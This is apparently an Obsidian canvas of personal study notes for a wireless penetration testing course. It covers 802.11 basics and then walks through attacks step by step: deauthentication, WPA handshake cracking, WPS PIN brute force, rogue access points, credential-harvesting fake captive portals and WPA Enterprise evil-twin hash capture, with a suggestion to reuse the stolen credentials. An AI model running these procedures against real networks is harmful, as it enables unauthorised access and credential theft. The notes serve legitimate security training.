{
	"nodes":[
		{"id":"ef8ceb5f666e33ea","type":"text","text":"# IEEE - The Institute of Electrical and Electronics Engineers (IEEE)\nThe IEEE's 802 committee[2](https://portal.offsec.com/courses/pen-210-9545/learning/ieee-80211-15801/ieee-15852/ieee-15979#fn-local_id_307-2) develops Local Area Network (LAN) standards and Metropolitan Area Network (MAN) standards. These include Ethernet, Token Ring, Wireless LAN, Bridging, and Virtual Bridged LANs.","x":-1653,"y":-861,"width":973,"height":201},
		{"id":"07f3215a6f640007","type":"text","text":"# 802.11 Standards and Amendments\nIEEE 802.11[1](https://portal.offsec.com/courses/pen-210-9545/learning/ieee-80211-15801/ieee-15852/ieee-15979#fn-local_id_308-1) is the standard for wireless LAN (WLAN). The specifications cover the physical layer and the Media Access Control (MAC) section of the data link layer in the OSI model.[2](https://portal.offsec.com/courses/pen-210-9545/learning/ieee-80211-15801/ieee-15852/ieee-15979#fn-local_id_308-2)\n\nThe 802.11 committee has released amendments to the standards as wireless technology has advanced. We will cover the amendments listed below:\n\n- _802.11_: The original WLAN standard\n- _802.11a_: Up to 54 Mbit/s on 5 GHz\n- _802.11b_: 5.5 Mbit/s and 11 Mbit/s on 2.4 GHz\n- _802.11g_: Up to 54 Mbit/s on 2.4 GHz, backwards compatible with 802.11b\n- _802.11h_: Regulatory requirement to limit power and transmission in the 5GHz band\n- _802.11i_: Provides enhanced security\n- _802.11n_: Provides higher throughput with Multiple Input/Multiple Output (MIMO), aka Wi-Fi 4\n- _802.11ac_: Very High Throughput < 6 GHz, aka Wi-Fi 5\n- _802.11ad_: Multi-Gigabit in the 60GHz band, known as WiGig\n- _802.11ax_: High Efficiency (HE) Wireless LAN, aka Wi-Fi 6\n\n![[Pasted image 20250506102517.png]]","x":-621,"y":-861,"width":973,"height":1081},
		{"id":"03feca6ebfc3e525","type":"text","text":"\n# Essential IEEE 802.11 Terms & Acronyms\n\n|||\n|---|---|\n|**WLAN**|Wireless Local Area Network|\n|**SSID**|Service Set Identifier (Wi-Fi network name)|\n|**BSSID**|Basic Service Set Identifier (MAC address of an access point)|\n|**CSMA/CA**|Carrier Sense Multiple Access with Collision Avoidance|\n|**DSSS**|Direct-Sequence Spread Spectrum – modulation used in early Wi-Fi|\n|**FHSS**|Frequency-Hopping Spread Spectrum – another early modulation method|\n|**OFDM**|Orthogonal Frequency-Division Multiplexing – used in 802.11a/g/n/ac|\n|**OFDMA**|Orthogonal Frequency-Division Multiple Access – used in 802.11ax|\n|**MIMO**|Multiple Input Multiple Output – multiple antennas used to send/receive data|\n|**SU-MIMO**|Single-User MIMO – communicates with one device at a time|\n|**MU-MIMO**|Multi-User MIMO – communicates with multiple devices simultaneously|\n|**Beamforming**|Signal steering toward specific devices to improve performance|\n|**QAM**|Quadrature Amplitude Modulation – modulation method (e.g., 64-QAM, 256-QAM)|\n|**MCS**|Modulation and Coding Scheme – defines data rate (based on streams & QAM)|\n|**HT20 / HT40**|High Throughput 20/40 MHz channel widths (802.11n)|\n|**TX / RX**|Transmit / Receive|\n|**TX Chain**|One transmit path with antenna and radio|\n|**RX Chain**|One receive path with antenna and radio|\n|**Spatial Stream**|An independent data stream sent via MIMO|\n|**RTS/CTS**|Request to Send / Clear to Send – prevents hidden node collisions|\n|**DFS**|Dynamic Frequency Selection – avoids radar interference (802.11h)|\n|**TPC**|Transmit Power Control – reduces transmission power to minimize interference|\n|**SISO**|Single Input Single Output – used before MIMO (802.11a/b/g)|\n|**STBC**|Space-Time Block Code – sends duplicate data across antennas|\n|**Guard Interval**|Time between transmissions to reduce interference|\n|**Channel Width**|Frequency width of Wi-Fi channels (20, 40, 80, 160 MHz)|\n|**Center Frequency**|Middle frequency of a channel's bandwidth|\n|**SSID Broadcast**|Transmission of Wi-Fi name in beacon frames|","x":411,"y":-861,"width":990,"height":981},
		{"id":"667af5e282b6f117","type":"text","text":"\n\n```mermaid\n%%{init: {\"flowchart\": {\"htmlLabels\": false}} }%%\nflowchart LR\n    \n    OPEN[\"`**Open Wi-Fi<br>**\n\t- No encryption.\n\t- Anyone can sniff traffic.\n\t- Used in public hotspots, legacy mesh setups.`\"]\n\n\tWEP[\"`**WEP<br>Wired Equivalent Privacy**\n\t1997\n\tRC4 + 24-bit IV\n\tWeak, easily cracked\n\t.\n\tCreated when the 802.11 standard was released in order to give privacy features similar to those found in wired networks.`\"]\n    \n    \n    WPA[\"`**WPA<br>Wi-Fi Protected Access**\n\t2003\n\t- Transitional fix using TKIP (backward compatible with WEP).\n\t- Adds MIC, IV sequencing, per-packet keying.<br>\n\t\tAs soon as flaws were discovered in WEP (WEP can be cracked in under a minute), the IEEE created a new group called 802.11i aimed at improving Wi-Fi security. Wi-Fi Protected Access (WPA) superseded WEP in 2003, followed by WPA2 in 2004 (802.11i standard).\n`\"]\n    \n    WPA2[\"`**WPA2**<br>2004\n\t- Based on 802.11i standard.\n\t- Uses AES-CCMP (strong encryption).\n\t- WPA encryption:\n\t\t- WPA-PSK = Personal\n\t\t- WPA-Enterprise = RADIUS + 802.1X\n\t`\"]\n    \n    WPA3[\"`**WPA3**\n\t2018\n\t- Replaces PSK with SAE (Dragonfly handshake).\n\t- Forward Secrecy, even if password is known later.\n\t- 192-bit Enterprise mode (GCMP-256 + HMAC-SHA384).\n\t- PMF (802.11w) mandatory.\n\t`\"]\n\n   OWE[\"`**OWE<br>Opportunistic Wireless Encryption**\n2018\nOWE allows for the mitigation of attacks and eavesdropping on open networks.\n\t- Encrypts open networks (Enhanced Open).\n\t- Uses Diffie-Hellman exchange during association.\n\t- PMF required.\n\t- No password needed; automatic encryption.`\"]\n\n    OPEN --> WEP\n    WEP --> WPA\n    WPA --> WPA2\n    WPA2 --> WPA3\n\tOPEN --> OWE\n\n%% class OPEN,WEP,WPA,WPA2,WPA3,OWE internal-link\n\n```\n\n# WPS (Wireless Protected Setup)\n\nProtocol allows users to pair devices to a network without having to enter the ESSID and/or its (sometimes complex) passphrase.\n- Easy connection via button, PIN, NFC (since 2006).\n- Standardizes device onboarding across vendors.\n- Still vulnerable (PIN brute force).\n- M1–M8 EAP message exchange defines setup steps.\n- Roles:\n\t- Enrollee – device joining the network\n\t - Registrar – device configuring the enrollee\n- Setup Methods:\n\t1. Push-button (physical/virtual)\n\t2. PIN entry (on AP or client)\n\t3. NFC or USB (rare/deprecated)\n- Process:\n\tEAP start → Identity exchange → WSC messages (M1–M8)\n\nEnds with WPA credentials delivered to enrollee\n# 802.11w (Protected Management Frames)\n- Adds integrity protection for management frames (e.g., deauth/disassoc).\n- Prevents DoS & spoofing.\n- Mandatory in WPA3.\n- Uses IGTK for broadcast/multicast protection.\n","x":1460,"y":-861,"width":1600,"height":1392},
		{"id":"9bc8bd86b4e64dd1","type":"text","text":"# Devices info\n```bash\nsudo airmon-ng # list devices and infos\n\nsudo lsusb -vv # list USB devices and its infos\n\nsudo modinfo <driver_name> # get driver info\nsudo modprobe ath9k_htc blink=0 # example, disable blinking on network activity on the ath9k_htc driver, by resetting the _blink_ parameter when loading the driver\n\n```\nWhile it is possible to build drivers in the kernel itself in Linux, most drivers are usually Loadable Kernel Modules (LKM), [1](https://portal.offsec.com/courses/pen-210-9545/learning/linux-wireless-tools,-drivers,-and-stacks-15799/loading-and-unloading-wireless-drivers-15882/loading-and-unloading-wireless-drivers-16039#fn-local_id_63-1) which are only loaded when necessary to avoid wasting memory. Other operating systems use loadable kernel modules as well, but name the feature differently.\n\n```bash\n# provide lots of detailed information about the wireless devices and their capabilities\nsudo iw list\n```\n```bash\n# Check interface info\nsudo iw dev wlan0 info\n```\n## Regulatory body info for interface\nCentral Regulatory Domain Agent (CRDA), helps radios stay compliant with wireless regulations around the world. It is used by the cfg80211 wireless subsystem to enforce the regulatory domain settings for a given location. Countries' regulations can be fairly complex, and CRDA sets the radio to operate within the regulations of the operating country. Specifically, it enforces transmit power limits on the radio, prevents the radio from transmitting on restricted frequencies, and abides by any other limitation such as DFS.\n```bash\n# display the current regulatory domain\nsudo iw reg get\n```\n```bash\n# change the regulatory domain (not persistant)\nsudo iw reg set US\n\n# set the regulatory domain (persistant acros rebots)\nsudo nano /etc/default/crda\n# Set REGDOMAIN=US\n```\n\n# Use interface to scan for Wi-fi Access Points information\n```bash\n# get a listing of wireless access points that are within range of wireless card\nsudo iw dev wlan0 scan | grep SSID\n# Scan for SSIDs + Channels that AP uses\nsudo iw dev wlan0 scan | egrep \"DS Parameter set|SSID:\"\n```\n# Interface management \n```bash\n# Create monitor interface\nsudo iw dev wlan0 interface add wlan0mon type monitor\nsudo ip link set wlan0mon up\n\n# Delete monitor interface\nsudo iw dev wlan0mon interface del\n```\n```bash\n# Sniff traffic\nsudo tcpdump -i wlan0mon\n```\n\n# $ rfkill\n_rfkill_ is a tool to enable or disable connected wireless devices. We can use it for Wi-Fi, as well as for Bluetooth, mobile broadband such as 4G/LTE, 5G, WiMax, GPS, FM, NFC, and any other radio.\n\n\"Soft blocked\" refers to a block from rfkill, done in software. \"Hard blocked\" refers to a physical switch or BIOS parameter for the device. rfkill can only change soft blocks.\n```bash\nsudo rfkill list\n\nsudo rfkill block 1\nsudo rfkill unblock 1\n\nsudo rfkill block all\nsudo rfkill unblock all\n```\n","x":3120,"y":-861,"width":831,"height":1819},
		{"id":"f373f66b8f8f446c","type":"file","file":"NOTES/99. TOOLS/Wireshark/Wireshark.md","x":4000,"y":-861,"width":960,"height":2141},
		{"id":"9bf0aeb5c00a7f9a","type":"file","file":"NOTES/99. TOOLS/Aircrack-ng Suite/Aircrack-ng Suite.md","x":5040,"y":-861,"width":960,"height":2141},
		{"id":"1cd53da7e436b2fa","type":"text","text":"# Capture WPA/WPA2 4-way handshakes and crack them using wordlists, rule-based mutations, GPU acceleration, and precomputed hashes.\n\n## Preparation\n1. Capture the 4-way handshake\n\t```bash\n\t$ airmon-ng start wlan0\n\t$ airodump-ng wlan0mon # identify target AP and client\n\t$ airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon\n\t$ aireplay-ng -0 1 -a <BSSID> -c <client> wlan0mon\n\t```\n2. Verify handshake\n    Handshake message appears in airodump-ng\n    ```bash\n    airdecap-ng -p <passphrase> ... #  to decrypt traffic for verification\n    ```\n## Wordlist Attacks\n\n- Using Default Wordlist:\n```bash\naircrack-ng -w /path/to/wordlist -b <BSSID> -e <ESSID> capture.cap\n```\n\n**Wordlist Mutations:**\n\n|                     |                                                                                                                         |\n| ------------------- | ----------------------------------------------------------------------------------------------------------------------- |\n| **John the Ripper** | - Modify `/etc/john/john.conf` rules <br>- Pipe output:<br> `john --wordlist=... --rules --stdout aircrack-ng -w - ...` |\n| **Crunch**          | - Generate brute-force lists with patterns:<br>`crunch 11 11 -t password%%% / aircrack-ng -w - ...`                |\n| **RSMangler**       | - Generate permutations: <br> `rsmangler --file wordlist.txt / aircrack-ng -w - ...`                                    |\n       \n\n## Hashcat Cracking\n\n1. Convert to correct format:\n```bash\nhcxpcapngtool -o hash.hc22000 capture.cap`\n```\n\n2. Crack with CPU/GPU:\n```bash\nhashcat -m 22000 -a 0 hash.hc22000 /usr/share/john/password.lst\n```\n\n- Avoid deprecated `-m 2500`; prefer `-m 22000`\n- Use `--force` or `--deprecated-check-disable` only when necessary\n- Use `--restore` to resume interrupted sessions\n\n## Precomputed Hashes\n### $ Airolib-ng\n- Import ESSID: `airolib-ng db.sqlite --import essid essid.txt`\n- Import passwords: `--import passwd`\n- Batch generate PMKs: `--batch`\n- Crack with Aircrack-ng:\n\n```bash\naircrack-ng -r db.sqlite capture.cap\n```\n\n### $ coWPAtty\n1. Generate hashes:\n\t```bash\n\tgenpmk -f wordlist -s ESSID -d output\n\tgenpmk -f /usr/share/john/password.lst -d wifuhashes -s wifu\n\t```\n2. Crack:\n\t```bash\n\tcowpatty -r capture.cap -d output -s ESSID\n\tcowpatty -r wpajohn-01.cap -d wifuhashes -s wifu\n\t```\n","x":6080,"y":-861,"width":960,"height":2141},
		{"id":"a4fccce169e6ed68","type":"text","text":"# Attacking WPS Networks\n**WPS Vulnerabilities**\n- WPS PIN Brute-Force Attack\n\t- **8-digit PIN**: Last digit = checksum → 10M → effective search space: ~11,000\n\t- Verification is split (M1–M4 and M5–M8)\n- Real-World Issues\n\t- Some APs **cannot disable** WPS or **ignore GUI settings**\n\t- **Lockout** and **timeouts** after failed attempts\n- PixieWPS Attack\n\t- Exploits **weak RNGs** in chipsets\n\t- Offline attack — very fast if vulnerable\n\t- Implemented in `reaver -K`\n\n## WPS Attack\n\n1. Identify WPS-enabled APs\n\t```bash\n\twash -i wlan0mon\n\t```\n2. Brute-Force PIN (Reaver)\n\t```bash\n\treaver -b <BSSID> -i wlan0mon -vv\n\t```\n3. PixieWPS Attack\n\t```bash\n\treaver -b <BSSID> -i wlan0mon -vv -K\n\t```\n4. Known Default PINs\n\t```bash\n\tsudo apt install airgeddon\n\tsource /usr/share/airgeddon/known_pins.db\n\techo ${PINDB[\"<OUI>\"]}\n\t```\n5. Test Single PIN (Blank/Default)\n\t```bash\n\treaver -b <BSSID> -i wlan0mon -p '' -vv\n\t```\n\n\n## Troubleshooting\n\n| Problem                               | Solution                                           |\n| ------------------------------------- | -------------------------------------------------- |\n| `WPS transaction failed (code: 0x03)` | Restart Reaver without `-K`, resume session        |\n| Reaver retries same PIN               | Increase verbosity (`-vv`) or change wireless card |\n| WPS locked                            | Use `mdk3` or `mdk4` for DoS to force AP reboot    |\n| Driver doesn’t switch channels        | Add `-c <channel>` manually                        |\n| ACK problems                          | Try a different wireless card/chipset              |","x":7160,"y":960,"width":960,"height":1340},
		{"id":"f15b43d1a9f3fa4d","type":"text","text":"# Rogue Access Points\n## The Basics of Rogue APs\n\n- **Rogue AP**: An unauthorized or malicious access point (e.g., mimicking a real AP).\n- **Attack Goal**: Trick client devices into connecting to a **fake AP** to capture the **4-way handshake**.\n- Relies on **PNL** (Preferred Network List) behavior in client devices.\n- Devices tend to auto-connect to **known ESSIDs** with matching encryption.\n\n\n### Discovery\n```bash\nsudo airodump-ng -w discovery --output-format pcap wlan0mon\n```\n\n\n### Creating a Rogue AP\n\n```bash\nsudo apt install hostapd-mana # Install hostapd-mana\n```\n```bash\n# Config File (Mostar-mana.conf):\n\ninterface=wlan0\nssid=Mostar\nchannel=1\nhw_mode=g\nieee80211n=1\nwpa=3\nwpa_key_mgmt=WPA-PSK\nwpa_passphrase=ANYPASSWORD\nwpa_pairwise=TKIP CCMP\nrsn_pairwise=TKIP CCMP\nmana_wpaout=/home/kali/mostar.hccapx\n```\n\n```bash\nsudo hostapd-mana Mostar-mana.conf # Start Rogue AP\n```\nLook for `MANA: Captured WPA/2 handshake` messages\n\n### Deauthentication (to force reconnection)\n```bash\nsudo airmon-ng start wlan1 1 # Use second wireless card\n\nsudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon # Send deauth packets\n```\nClients will drop from the real AP and attempt to connect to your rogue AP.\n\n### Cracking the Captured Handshake\n```bash\naircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst\n```\n\n| Scenario              | Tactic                                                          |\n| --------------------- | --------------------------------------------------------------- |\n| Clients won’t connect | Deauth them from legit AP                                       |\n| Rogue AP ignored      | Use stronger signal or same encryption settings                 |\n| WPA3 APs              | Trick into WPA2 by using `ieee80211w=1` and only WPA2 in config |\n| No handshake?         | Wait or target known probing clients instead of a specific AP   |\n\n\n\n\n\n\n","x":8200,"y":960,"width":960,"height":1461},
		{"id":"3c3dbe1da62e9343","type":"text","text":"# Attacking Captive Portals\nA captive portal is a web page that appears when you connect to a public or guest Wi-Fi network. It's essentially a login page or a page requiring you to agree to terms and conditions before being granted full access to the network.\n\n# Discovery Phase\n\n- **Goal**: Identify the target AP and capture a WPA/WPA2 handshake (if encrypted).\n- **Tools**:\n    - `airmon-ng`: Enable monitor mode.\n    - `airodump-ng`: Scan networks and identify target (SSID, BSSID, channel).\n    - `aireplay-ng`: Deauthenticate clients to capture handshakes.\n- **Output**: A `.cap` file (e.g., `discovery-01.cap`) containing the handshake.\n\n# Build a Captive Portal\n\n- **Scenario**: Either clone a real captive portal (if the target uses one) or build a fake one.\n- **Steps**:\n    - Use `wget -r -l2 <site>` to clone a target's landing page.\n    - Customize it into a fake login form using PHP (`index.php`).\n    - Write a backend script (`login_check.php`) to:\n        - Save user input\n        - Validate it against the `.cap` file using `aircrack-ng`\n- **Apache Setup**:\n    - Use `/var/www/html/portal` as document root.\n    - Enable `mod_rewrite` and `mod_alias` for proper redirects.\n    - Add SSL support if targeting Chrome.\n# Network Setup\n- **Goal**: Provide IP addresses and DNS to connected clients.\n- **Steps**:\n    - Assign a static IP to `wlan0`: `192.168.87.1/24`\n    - Install and configure `dnsmasq` for:\n        - DHCP leases\n        - DNS spoofing (redirect `.com`, `.net`, `.org` to us)\n    - Use `nftables` to force DNS redirection: port 53 → us.\n\n# Launch Rogue AP\n- **Tool**: `hostapd` or `hostapd-mana`\n- **Config**: Set SSID, channel, 802.11n, no encryption (or OWE for stealth).\n- **Run**: `sudo hostapd -B mco-hostapd.conf`\n\n# Credential Capture\n- When a victim connects:\n    - They get IP + DNS info via `dnsmasq`.\n    - Their browser is redirected to your fake login page.\n    - Upon submission, `login_check.php`:\n        - Validates the password against the handshake.\n        - Stores the correct one in `/tmp/passphrase.txt`.\n\n# Testing\n- Monitor logs:\n    - `syslog` for `hostapd` and `dnsmasq`\n    - `access.log` for Apache activity\n- Use your own device for testing if no clients connect.\n\n# Tips & Notes\n- If the target AP uses **WPA3**, consider:\n    - Using WPA2 + 802.11w = optional to encourage downgrade.\n- **Special cases** (like Chrome behavior) require HTTPS + captive portal detection rules in Apache.\n- Use `tail -f` and `netstat` for monitoring.\n- Remember systemd’s `PrivateTmp` — Apache’s `/tmp` is not your `/tmp`.","x":9240,"y":960,"width":960,"height":1901},
		{"id":"c98f7557d7b9dd49","type":"text","text":"# Attacking WPA Enterprise – Study Notes\n- **WPA Enterprise** uses **EAP (Extensible Authentication Protocol)** with a **RADIUS server** for authentication.\n- Instead of a PSK, credentials (username/password or certificates) are used to derive the **Pairwise Master Key (PMK)**.\n- **Common EAP methods**:\n    - **EAP-TLS**: Mutual certificate-based authentication (most secure).\n    - **EAP-TTLS**: TLS tunnel; inner auth with PAP, CHAP, MS-CHAP(v2).\n    - **PEAP**: TLS tunnel; typically MS-CHAPv2 inside.\n\n## PEAP Exchange\n- Capturing a WPA Enterprise session with **Wireshark** reveals:\n    - AP advertises WPA1/WPA2 + CCMP/TKIP and WPA Enterprise (MGT).\n    - 19+ EAP frames exchanged before the 4-way handshake.\n    - Inside the TLS tunnel (Phase 2), **MS-CHAPv2** credentials are transmitted.\n\n## Tools:\n- `Wireshark` filters:\n    - `eap`\n    - `tls.handshake.type == 11`\n    - `tls.handshake.certificate`\n- Certificates can be extracted and analyzed:\n    - Exported as `.der` from Wireshark\n    - Converted to `.pem` with `openssl`\n\n# Attack Setup\n\n1. Reconnaissance\n\t1. Put interface into monitor mode\n\t```bash\n\tsudo airmon-ng start wlan0\n\tsudo airodump-ng wlan0mon\n\t```\n\t2. Identify target SSID, BSSID, and channel\n\n\n2. Generate Certificates\n\t1. Install `freeradius`\n\t```bash\n\tsudo apt install freeradius\n\t```\n\t2. Edit `/etc/freeradius/3.0/certs/ca.cnf` and `server.cnf` to mimic target organization.\n\t3. Regenerate certs\n\t```bash\n\tcd /etc/freeradius/3.0/certs\n\tsudo rm dh\n\tsudo make\n\t```\n3. Configure hostapd-mana\n\t1. Install\n\t```bash\n\tsudo apt install hostapd-mana\n\t```\n\t2. Create config `/etc/hostapd-mana/mana.conf`:\n\t    - `ssid`, `interface`, `channel`\n\t    - `ca_cert`, `server_cert`, `server.key`\n\t    - Enable `mana_wpe`, `mana_credout`, `eap_server=1`\n\t\t- Create `mana.eap_user` file:\n\t\t```bash\n\t\t*     PEAP,TTLS,TLS,FAST\n\t\t\"t\"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2  \"pass\" [2]\n\t\t```\n4. Run Attack\n\t1. Start rogue AP\n\t```bash\n\tsudo hostapd-mana /etc/hostapd-mana/mana.conf\n\t```\n\t2. Deauthenticate clients to encourage reconnection:\n\t```bash\n\tsudo aireplay-ng -0 0 -a <BSSID> wlan1mon\n\t```\n5. Crack Captured Credentials\n\t- Output found in `/tmp/hostapd.credout`\n\t- Crack **MS-CHAPv2 hash** using `asleap`:\n\t```bash\n\tasleap -C <challenge> -R <response> -W /usr/share/john/password.lst\n\t```\n\n## Optional Escalation\n- Use `crackapd` to auto-crack and allow full connection.\n- Provide internet access via DHCP + routing for phishing/mitm.\n- Reuse stolen credentials to access corporate services or the real AP.\n\n## Key Takeaways\n- **WPA Enterprise** is secure only if:\n    - Proper cert validation is enforced.\n    - Clients do not connect to unknown APs.\n- Misconfigured clients will connect to rogue APs, leaking **MS-CHAPv2** hashes.\n- **MS-CHAPv2** is vulnerable and can be cracked with tools like `asleap`.","x":10240,"y":960,"width":960,"height":2421},
		{"id":"460cab90f8201224","type":"text","text":"# bettercap\n\n![[bettercap#]]\n![[bettercap#Automation with ticker]]\n![[bettercap#Wi-Fi]]\n","x":8200,"y":-861,"width":960,"height":1141},
		{"id":"ebca8d60ea183a19","type":"text","text":"# Kismet\n![[Kismet]]","x":9280,"y":-861,"width":960,"height":1501},
		{"id":"a4f677e63f1fb85d","type":"text","text":"# Manual Network Connections\nManually set up and manage network connections without relying on network managers.\n# Connecting to an Access Point with `wpa_supplicant`\n\nA flexible client for connecting to Wi-Fi, supporting WEP, WPA/WPA2, WPA3, OWE, and WPA Enterprise (not covered here).\n\n## Open Network Example\n\n```ini\nnetwork={\n  ssid=\"hotel_wifi\"\n  scan_ssid=1\n  key_mgmt=NONE\n}\n```\n\n## WPA/WPA2-PSK Example\n\n```ini\nnetwork={\n  ssid=\"home_network\"\n  scan_ssid=1\n  psk=\"correct battery horse staple\"\n  key_mgmt=WPA-PSK\n}\n```\n\n- Optional: `pairwise=CCMP` or `pairwise=TKIP`\n## Using `wpa_passphrase`\n\n```bash\nwpa_passphrase home_network > home_network.conf\n```\n\n## Connecting\n\n```bash\nsudo wpa_supplicant -i wlan0 -c wifi-client.conf\n```\n\nTo run in background:\n\n```bash\nsudo wpa_supplicant -i wlan0 -c wifi-client.conf -B\n```\n\n## Requesting a DHCP Lease\n\n```bash\nsudo dhclient wlan0\n```\n\n---\n\n# Setting up an Access Point\n**Requirements:** 2 network interfaces (e.g., eth0 + wlan0)\n\n## Internet Access\n\nUse Ethernet or a secondary Wi-Fi adapter.  \nCheck AP mode support:\n\n```bash\nsudo iw list\n```\n\nLook for `AP` in \"Supported interface modes\".\n\n## Static IP on AP Interface\n\n```bash\nsudo ip link set wlan0 up\nsudo ip addr add 10.0.0.1/24 dev wlan0\n```\n\n## DHCP Server with `dnsmasq`\n\n```ini\n$ cat dnsmasq.conf\n\ndomain-needed\nbogus-priv\nno-resolv\nfilterwin2k\nexpand-hosts\ndomain=localdomain\nlocal=/localdomain/\nlisten-address=10.0.0.1\ndhcp-range=10.0.0.100,10.0.0.199,12h\ndhcp-lease-max=100\ndhcp-option=option:router,10.0.0.1\ndhcp-authoritative\nserver=8.8.8.8\nserver=8.8.4.4\n```\n\n```bash\nsudo dnsmasq --conf-file=dnsmasq.conf # Start the server:\nsudo tail /var/log/syslog | grep dnsmasq # Check logs:\n```\n\n## Routing and NAT with `nftables`\n\n```bash\necho 1 | sudo tee /proc/sys/net/ipv4/ip_forward # Enable IP forwarding\nsudo apt install nftables # Install `nftables`\n```\n\n```bash\n# Create NAT rules\nsudo nft add table nat\nsudo nft 'add chain nat postrouting { type nat hook postrouting priority 100 ; }'\nsudo nft add rule ip nat postrouting oifname \"eth0\" ip daddr != 10.0.0.1/24 masquerade\n```\n\n## Setup Fake AP with `hostapd`\n\n```ini\n$ cat hostapd.conf \n\ninterface=wlan1\nssid=wifi-offices\nchannel=11\nhw_mode=g\nieee80211n=1\nwpa=2\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\nwpa_passphrase=123123123\nmana_wpaout=hostapd.hccapx\n# driver=nl80211\n```\n```bash\nsudo hostapd hostapd.conf # Run\nsudo hostapd -B hostapd.conf # To run in background\n```\n","x":11360,"y":-861,"width":960,"height":3501},
		{"id":"b1ad8a38d5fe55b0","type":"text","text":"# Wireless Networks Infrastructures\n## Overview\n- **Infrastructure**: Basic relationship between APs and clients (BSS/ESS).\n- **WDS (Wireless Distribution System)**: Connects APs wirelessly (bridging or repeating).\n- **Ad-Hoc Networks**: Equal peers, one acts like AP.\n- **Mesh Networks**: All APs are equal, used in complex environments.\n- **Wi-Fi Direct (P2P)**: Peer-to-peer wireless communication.\n- **Monitor Mode**: Enables packet capture/injection, essential for testing.\nAll networks (except monitor mode) require an SSID.\n\n## Infrastructure\n- **BSS (Basic Service Set)**: One AP + one STA.\n- **ESS (Extended Service Set)**: Multiple APs on same wired DS.\n- **DS (Distribution System)**: Typically a wired network.\n- **Linux Terminology**:\n    - Station = Managed mode\n    - AP = Master mode\n\n## Wireless Distribution Systems (WDS)\n- Used to wirelessly connect APs without Ethernet.\n- **Modes**:\n    - Wireless Bridging: AP-to-AP only.\n    - Wireless Repeating: APs and STAs communicate.\n- Shares channel with original AP (may reduce throughput).\n\n## Ad-Hoc Networks\n- **IBSS (Independent Basic Service Set)**.\n- No AP; stations communicate directly.\n- One STA handles beaconing and auth.\n- Less reliable, potential for random disconnects.\n- WPA2 difficult; mostly limited to WEP/open.\n### Ad-Hoc Demo (Pseudo-IBSS)\n- Pre-standard, no management frames.\n- BSSID is 00:00:00:00:00:00.\n- Slightly higher throughput; requires manual setup.\n\n## Mesh Networks\n- Used in large/unwired areas (e.g. campuses, historic buildings).\n- Multiple APs, peer-to-peer linking.\n- **802.11s**: Standard for mesh networks.\n- **Routing protocols**:\n    - Ad-Hoc: AODV, BATMAN, OSLR\n    - 802.11s: HWMP (default)\n- **Device Classes**:\n    - **MP**: Mesh Point\n    - **MAP**: Mesh AP (MP + AP)\n    - **MPP**: Mesh Portal (connects mesh to wired network)\n### Mesh Peering Modes\n- **MPM**: Unsecure\n- **AMPE**: Secure using SAE or 802.1X\n    - SAE: Password-based\n    - 802.1X: Auth server (more secure)\n\n## Wi-Fi Direct (Wi-Fi P2P)\n- Peer-to-peer communication.\n- No 802.11 standard; Wi-Fi Alliance spec.\n- Uses WPS-style WPA2 connections.\n- Common uses:\n    - File/printer sharing\n    - Wireless display (Miracast)\n    - Gaming\n    - Tethering\n\n","x":12400,"y":-861,"width":1228,"height":2061},
		{"id":"3f5422a83988d74e","type":"text","text":"# Connect VM to USB wifi adapter\n<iframe width=100%  height=500 src=\"https://www.youtube.com/embed/_tKg9dMu4WQ?si=GD4U72GuK_7-b2y1\" frameborder=\"0\" allowfullscreen></iframe>","x":-2640,"y":-861,"width":920,"height":661},
		{"id":"f3ede72df802f33a","type":"link","url":"https://lab.wifichallenge.com/","x":-2640,"y":-1640,"width":920,"height":725},
		{"id":"e240a98c6022bade","type":"text","text":"# Kismet\n```bash\n$ kismet\n```","x":-2640,"y":379,"width":360,"height":141},
		{"id":"29dda3f99df742c5","type":"text","text":"# Discover Wi-Fi Networks","x":-2345,"y":130,"width":365,"height":90,"color":"1"},
		{"id":"f0b358edb73df44b","type":"text","text":"# Aircrack-ng\n```bash\n$ airodump-ng <interface>\n$ airodump-ng -c 1,6,11 # listen on specific channels \n$ airodump-ng -w <file_name> # save result to file\n$ airodump-ng -b <BSSID> # connect to particular target AP\n\n$ aireplay-ng -0 <num> -c <client_mac> -a <BSSID> <intf> # deauthentication attack\n# <num> stands for deauth attack repeated for num times or use 0 (zero) for infinite loop\n# <client mac> is the victim client MAC address \n# <BSSID> is the target BSSID (the AP MAC address) \n# <intf> is your monitoring interface\n```\n```bash\n$ airmon-ng start <interface> # start monitor mode, creates new network interface mon0\n$ iwconfig mon0 channel 11 # set listening on speified channel\n```","x":-2180,"y":388,"width":720,"height":422},
		{"id":"b601a3e0ff0a1aa3","type":"text","text":"```bash\n# enable monitor mode\nairmon-ng start wlan0\n```\n```bash\n# catch wifi 802.11 frames (scan wifi) (2.4 + 5 GHz) and get data about surrounding\nairodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg\n\nairodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg -c 11 --bssid F0:9F:C2:6A:88:26\n```\n```bash\n# dictionary attack to find unknown ESSID (name)\n# set channel to 11 on device wlan0mon \niwconfig wlan0mon channel 11\n# bruteforce\nmdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f ~/wifi-rockyou.txt\n```","x":-2263,"y":7973,"width":699,"height":907},
		{"id":"919fb6368dc6c60e","type":"text","text":"# discover hosts in network\n```bash\narp-scan -I wlan3 -l\n```","x":-1484,"y":7680,"width":699,"height":170},
